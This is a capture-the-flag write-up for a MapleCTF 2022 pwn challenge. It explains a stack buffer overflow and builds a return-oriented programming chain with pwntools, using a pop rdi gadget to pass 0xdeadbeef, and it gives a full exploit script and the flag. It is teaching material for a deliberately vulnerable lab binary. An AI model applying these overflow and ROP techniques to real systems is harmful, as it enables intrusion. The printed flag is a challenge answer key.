# wetuwn-owiented-pwogwamming

## Challenge

The challenge prints a short message than waits for input.
Once we provide input, the program exits.

```
$ ./wetuwn-owiented-pwogwamming 
uwu owo rawrxd
Hello, world!
```

There is a `win` function that does not get called normally.

```c
void win() {
    FILE* flagfile = fopen("flag.txt", "r");

    if (flagfile == NULL) {
        puts("Error: flag.txt does not exist, contact an admin!");
        exit(1);
    }

    fgets(flag, FLAG_LEN, flagfile);

    if (rawrxd && (uwu && owo)) {
        puts(flag);
    } else {
        puts("oh nyo youw e-expwoit has faiwed *sweats*");
    }
}
```

The function depends on 3 global variables:

```c
bool rawrxd = false;
bool uwu = false;
bool owo = false;
```

which do not get set normally.

There are also 3 functions `A`, `B`, and `C`, which do not get called normally.

```c
void A() {
    uwu = true;
    puts("uwu");
}

void B() {
    if (uwu) {
        owo = true;
        puts("owo");
    }
}

void C(int secwet) {
    if (secwet == 0xdeadbeef) {
        rawrxd = true;
        puts("rawrxd");
    }
}
```

These functions change the global variables listed above.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

There is a buffer overflow in `vuln`:

```c
void vuln() {
    char input[100];

    puts("uwu owo rawrxd");
    fgets(input, 0x100, stdin);
}
```

We have a buffer of 100 bytes, but we are reading 0x100 (256) bytes.

There is no canary and PIE is disabled, so we can control the return address, similar to the
"wetuwn-addwess" challenge.

However, if we try jumping to the `win` function, we get the following message:

```py
>>> from pwn import *
>>> exe = ELF('wetuwn-owiented-pwogwamming')
[*] '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> payload = flat({ 0x78: p64(exe.sym['win']) })
>>> io = exe.process()
[x] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming'
[+] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming': pid 2182252
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
[*] Process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming' stopped with exit code -11 (SIGSEGV) (pid 2182252)
uwu owo rawrxd
oh nyo youw e-expwoit has faiwed *sweats*
[*] Got EOF while reading in interactive
```

We can see that we hit the second branch of this if-statement:

```c
if (rawrxd && (uwu && owo)) {
    puts(flag);
} else {
    puts("oh nyo youw e-expwoit has faiwed *sweats*");
}
```

To get the flag, all of `rawrxd`, `uwu`, and `owo` must be true.
To set these variables, we can call `A`, `B`, and `C` before calling the `win` function.

We can chain these functions using a technique called "return-oriented programming".

When a function is called normally, it first pushes the return address onto the stack.
When we jump to a function by overwriting a return address, this doesn't happen.
As a result, our new function will look at the next address on the stack for its return address.
This means we can chain functions by writing multiple return addresses consecutively.

Let's change our payload to call `A`, then `win`:

```py
payload = flat({ 0x78: [p64(exe.sym['A']), p64(exe.sym['win'])] })
```

Using this payload, we get the following output:

```py
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
[*] Process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming' stopped with exit code -11 (SIGSEGV) (pid 2184453)
uwu owo rawrxd
uwu
oh nyo youw e-expwoit has faiwed *sweats*
```

We can see that we successfully called `A` as challenge printed an additional "uwu".

Note that `B` has to be called after `A`, so let's call `B` next:

```c
void B() {
    if (uwu) {
        owo = true;
        puts("owo");
    }
}
```

Our payload becomes:

```py
payload = flat({ 0x78: [p64(exe.sym['A']), p64(exe.sym['B']), p64(exe.sym['win'])] })
```

Using this payload, we get the following output:

```py
>>> io = exe.process()
[x] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming'
[+] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming': pid 2184956
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
[*] Process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming' stopped with exit code -11 (SIGSEGV) (pid 2184956)
uwu owo rawrxd
uwu
owo
oh nyo youw e-expwoit has faiwed *sweats*
[*] Got EOF while reading in interactive
```

We successfully called `B` and satisfied its condition.

Lastly, we need to call `C`.
However, `C` takes one argument, `secwet`, and compares it against 0xdeadbeef.

The calling convention specifies that the first result is passed through the RDI register.
To set registers, we can use rop gadgets.
These are short segments of executable code which end with a `ret` instruction.

Let's find a rop gadget that pops RDI from the stack:

Using ROPgadget:

```
$ ROPgadget --binary wetuwn-owiented-pwogwamming | grep "pop rdi"
0x00000000004013c3 : pop rdi ; ret
```

Using pwntools:

```py
>>> rop = ROP(exe)
[*] Loaded 14 cached gadgets for 'wetuwn-owiented-pwogwamming'
>>> rop.find_gadget(['pop rdi', 'ret'])[0]
4199363
>>> hex(_)
'0x4013c3'
```

This gadget will pop the next value of the stack into RDI.
If we add this to our ropchain, then add 0xdeadbeef, the RDI register will be set correctly for `C`.

Our payload becomes:

```py
payload = flat({ 0x78: [
    p64(exe.sym['A']),
    p64(exe.sym['B']),
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]),
    p64(0xdeadbeef),
    p64(exe.sym['C']),
    p64(exe.sym['win']),
]})
```

Using this payload, we get the following output:

```py
>>> io = exe.process()
[x] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming'
[+] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming': pid 2187384
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
[*] Process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-owiented-pwogwamming/wetuwn-owiented-pwogwamming' stopped with exit code -11 (SIGSEGV) (pid 2187384)
uwu owo rawrxd
uwu
owo
rawrxd
maple{w-wop_is_pwetty_coow}

[*] Got EOF while reading in interactive
```

We successfully chained functions and ropgadgets to meet the conditions for the `win` function to print
the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1444 wetuwn-owiented-pwogwamming
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('wetuwn-owiented-pwogwamming')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1444)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

payload = flat({
    0x70 + 8: [
        exe.sym['A'],
        exe.sym['B'],
        rop.find_gadget(['pop rdi', 'ret'])[0],
        0xdeadbeef,
        exe.sym['C'],
        exe.sym['win'],
        ],
    })

io.sendlineafter(b"uwu owo rawrxd\n", payload)

io.interactive()
```

## Flag

```
maple{w-wop_is_pwetty_coow}
```
